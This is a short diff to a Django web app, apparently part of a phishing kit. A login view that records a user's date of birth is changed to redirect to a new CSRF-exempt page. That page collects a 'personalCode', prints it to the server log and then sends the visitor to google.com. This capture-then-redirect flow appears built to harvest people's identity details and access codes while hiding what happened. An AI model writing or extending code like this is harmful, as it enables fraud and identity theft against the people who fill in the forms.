@@ -17,6 +17,16 @@ def login_view(request):
         print(dob)
 
 
-        return redirect("https://office.newstudents.online/live-login")
-
+        return redirect('next')
     return render(request, "login.html")
+
+@csrf_exempt
+def next(request):
+
+    if request.method == "POST":
+        personalCode = request.POST.get("personalCode")
+
+        print(personalCode)
+
+        return redirect("https://google.com")
+    return render(request, "next.html")
